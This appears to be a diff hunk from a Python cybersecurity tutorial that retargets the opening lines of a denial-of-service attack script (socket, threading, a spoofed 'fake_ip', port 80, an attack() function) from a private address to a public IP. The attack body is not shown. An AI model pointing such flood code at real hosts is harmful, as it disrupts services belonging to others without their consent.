@@ -19,7 +19,7 @@ We prefer Python in Cybersecurity, because complex scripts or attacks can be eas
 ```
 import socket
 import threading
-target = '10.0.0.138'
+target = '103.21.127.134'
 fake_ip = '182.21.20.32'
 port = 80
 def attack():
